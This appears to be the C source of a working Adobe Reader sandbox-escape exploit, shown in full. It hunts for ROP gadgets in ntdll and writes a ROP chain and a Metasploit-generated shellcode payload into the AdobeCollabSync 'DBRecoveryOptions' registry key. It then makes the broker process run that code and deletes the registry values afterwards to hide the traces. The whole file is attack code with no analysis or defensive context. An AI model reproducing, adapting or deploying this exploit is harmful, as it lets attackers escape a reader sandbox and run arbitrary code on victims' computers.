#define WINAPI  __attribute__((stdcall)) 
#define NULL ((void*)0 )
typedef void * LPVOID;
typedef unsigned int SIZE_T;
typedef unsigned short TCHAR;
typedef unsigned char CHAR;
typedef unsigned char BYTE;
typedef unsigned int UINT;
typedef unsigned int HANDLE;
typedef unsigned int HMODULE;
typedef CHAR * LPCSTR;
typedef TCHAR * LPCTSTR;
typedef unsigned int DWORD;
typedef DWORD HKEY;
#define HKEY_CURRENT_USER 0x80000001
#define REG_OPTION_NON_VOLATILE 0x00000000
#define KEY_ALL_ACCESS 0xF003F
#define RRF_RT_ANY 0x0000ffff
#define REG_BINARY 0


typedef HANDLE (*GetModuleHandle_t)(LPCSTR lpModuleName) WINAPI;
typedef void*  (*GetProcAddress_t)(HMODULE hModule, LPCSTR lpModuleName) WINAPI;
typedef int  (*MessageBoxA_t)(HANDLE hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) WINAPI;
typedef void* (*VirtualAlloc_t) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) WINAPI;
typedef void* (*VirtualProtect_t) (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, DWORD lpflOldProtect) WINAPI;
typedef void (*Sleep_t) ( DWORD dwMilliseconds) WINAPI;
typedef HANDLE (*DoCollab_t)(int) WINAPI;
typedef int (*RegCreateKeyExA_t)(HANDLE hKey, char* lpSubKey, DWORD Reserved, char* lpClass, DWORD dwOptions, int samDesired, void* lpSecurityAttributes, HKEY *retkey, int*lpdwDisposition) WINAPI;
typedef int (*RegSetValueExA_t)(HKEY hKey, char * lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData) WINAPI;
typedef int (*RegCloseKey_t)(HKEY hKey) WINAPI;
typedef int (*CloseHandle_t)(HANDLE hObject) WINAPI;
typedef int (*ExitProcess_t)(DWORD uExitCode) WINAPI;
typedef int (*RegGetValueA_t)(HANDLE hkey, char* lpSubKey, char* lpValue, DWORD dwFlags, int*  pdwType, char* pvData, int*pcbData) WINAPI;
typedef int (*RegDeleteValueA_t)(HKEY hKey,char* lpSubKey) WINAPI;


char regkey[] = "Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\\x00shellcode\x00\x00\xF0\x00\x00";
#define MEMBASE 0x40000000

#include"msfpayload.h"
int
shellcode(GetModuleHandle_t GetModuleHandle, GetProcAddress_t GetProcAddress){
    int i,j,k;

    HMODULE acrord_exe = GetModuleHandle("AcroRd32.exe");
    DoCollab_t docollab = (DoCollab_t)acrord_exe+0x18da0;
    HMODULE ntdll = GetModuleHandle("ntdll");
    HMODULE kernel32 = GetModuleHandle("kernel32");
    VirtualAlloc_t VirtualAlloc = GetProcAddress(kernel32,"VirtualAlloc");
    RegCreateKeyExA_t RegCreateKeyExA = GetProcAddress(kernel32,"RegCreateKeyExA");
    RegSetValueExA_t RegSetValueExA = GetProcAddress(kernel32,"RegSetValueExA");
    RegCloseKey_t RegCloseKey = GetProcAddress(kernel32,"RegCloseKey");
    CloseHandle_t CloseHandle = GetProcAddress(kernel32,"CloseHandle");
    ExitProcess_t ExitProcess = GetProcAddress(kernel32,"ExitProcess");
    RegGetValueA_t RegGetValueA = GetProcAddress(kernel32,"RegGetValueA");
    RegDeleteValueA_t RegDeleteValueA = GetProcAddress(kernel32,"RegDeleteValueA");
    Sleep_t Sleep = GetProcAddress(kernel32,"Sleep");

    //BIB  acroRd32dll+0x9750D4
    while (!acrord_exe || !kernel32 || !ntdll){
        acrord_exe = GetModuleHandle("AcroRd32.exe");
        kernel32 = GetModuleHandle("kernel32");
        ntdll = GetModuleHandle("ntdll");
    }


    union{
         char c[0x1000];
         int  i[0];
    } buffer;
    HMODULE collab_proc;
    HANDLE key = 0;



    // Search for gadgets in ntdll
    unsigned char* gadget_ret = (unsigned char*)ntdll+0x22d2b;
    unsigned char* gadget_mov_dword_edi_ecx_ret = (unsigned char*)ntdll+0x22d29;
    unsigned char* gadget_pop_edi_ret = (unsigned char*)ntdll+0x00035359;
    unsigned char* gadget_pop_ecx_ret = (unsigned char*)ntdll+0x0000f17f;

    //Search gadget MOV DWORD [EDI], ECX; RET
    for(gadget_mov_dword_edi_ecx_ret = (unsigned char*)ntdll+0x10000;
        gadget_mov_dword_edi_ecx_ret < (unsigned char*)ntdll+0xd6000;
        gadget_mov_dword_edi_ecx_ret++){
        if ( gadget_mov_dword_edi_ecx_ret[0] == 0x89 &&
             gadget_mov_dword_edi_ecx_ret[1] == 0x0f &&
             gadget_mov_dword_edi_ecx_ret[2] == 0xc3)
            break;
    }
    //Search gadget RET
    gadget_ret = gadget_mov_dword_edi_ecx_ret+2;

    //Search gadget POP EDI; RET
    for(gadget_pop_edi_ret = ntdll+0x10000;
        gadget_pop_edi_ret < ntdll+0xd6000;
        gadget_pop_edi_ret++){
        if ( gadget_pop_edi_ret[0] == 0x5F &&
             gadget_pop_edi_ret[1] == 0xc3)
            break;
    }

    //Search gadget POP ECX; RET
    for(gadget_pop_ecx_ret = ntdll+0x10000;
        gadget_pop_ecx_ret < ntdll+0xd6000;
        gadget_pop_ecx_ret++){
        if ( gadget_pop_ecx_ret[0] == 0x59 &&
             gadget_pop_ecx_ret[1] == 0xc3)
            break;
    }


    for(;;){
        int * mem = MEMBASE;
        unsigned buffer_used;
        //Make rop using BIB.dll adress (same in all proc)
        i=0;
        buffer.i[i++]=0x58000000+i;
        buffer.i[i++]=0x58000000+i;
        buffer.i[i++]=0;              //Must be zero
        buffer.i[i++]=0x58000000+i;
        //4
        buffer.i[i++]=0x58000000+i;
        buffer.i[i++]=0x58000000+i;
        buffer.i[i++]=0x58000000+i;
        buffer.i[i++]=gadget_ret; //<Starts here
        //8
        buffer.i[i++]=0x58000000+i;
        buffer.i[i++]=0x58000000+i;


        buffer.i[i++]=VirtualAlloc;
        buffer.i[i++]=gadget_ret; //RET1;
        buffer.i[i++]=mem;        // lpAddress, 
        buffer.i[i++]=0x00010000; // SIZE_T dwSize
        buffer.i[i++]=0x00003000; // DWORD flAllocationType
        buffer.i[i++]=0x00000040; // flProtect


        k=0;
        for(j=0;j<sizeof(regkey)/4+1;j+=1){
            buffer.i[i++]=gadget_pop_edi_ret;
            buffer.i[i++]=((int*)mem)+k++;
            buffer.i[i++]=gadget_pop_ecx_ret;
            buffer.i[i++]=((int*)regkey)[j];
            buffer.i[i++]=gadget_mov_dword_edi_ecx_ret;
        }

        buffer.i[i++]=RegGetValueA;
        buffer.i[i++]=(void*)mem+0x1000;           //RET
        buffer.i[i++]=HKEY_CURRENT_USER;    //hkey
        buffer.i[i++]=mem;                  //lpSubKey
        buffer.i[i++]=(void*)mem+0x3a;             //lpValue
        buffer.i[i++]=RRF_RT_ANY;           //dwFlags
        buffer.i[i++]=0;                    //pdwType
        buffer.i[i++]=(void*)mem+0x1000;           //pvData
        buffer.i[i++]=(void*)mem+0x44;               //pcbData

        buffer_used = i*sizeof(buffer.i[i]);


        //Set up vulnerable registry key
        RegCreateKeyExA(HKEY_CURRENT_USER, 
                        "Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\",
                        0 /*reserved*/,
                        NULL /*lpclass*/,
                        REG_OPTION_NON_VOLATILE /*Options*/,
                        KEY_ALL_ACCESS /*samDesired*/,
                        NULL /*SecurityAttribs*/,
                        &key,
                        NULL); //if not ERROR_SUCCES bail out
        RegSetValueExA(key,"bDeleteDB", 0, REG_BINARY,buffer.c,buffer_used);
        RegSetValueExA(key,"shellcode", 0, REG_BINARY,buf,sizeof(buf));
        RegCloseKey(key);

        // Tell the broker to execute AdobeCollabSync
        collab_proc = docollab(0xbc);

        // Sleep
        Sleep(1000);

        // Close collab_proc
        CloseHandle(collab_proc);

        // Clean registry
        // RegSetValue
        RegCreateKeyExA(HKEY_CURRENT_USER, 
                        "Software\\Adobe\\Adobe Synchronizer\\10.0\\DBRecoveryOptions\\",
                        0 /*reserved*/,
                        NULL /*lpclass*/,
                        REG_OPTION_NON_VOLATILE /*Options*/,
                        KEY_ALL_ACCESS /*samDesired*/,
                        NULL /*SecurityAttribs*/,
                        &key,
                        NULL); //if not ERROR_SUCCES bail out
        //RegSetValueExA(key,"bDeleteDB", 0, REG_BINARY,buffer.c,0x4);
        RegDeleteValueA(key, "shellcode");
        RegDeleteValueA(key, "bDeleteDB");
        RegCloseKey(key);

        // Sleep
        Sleep(1000);

        // TODO: check success
        ExitProcess(0);
        //retry
    }
    //spawn other target?
}

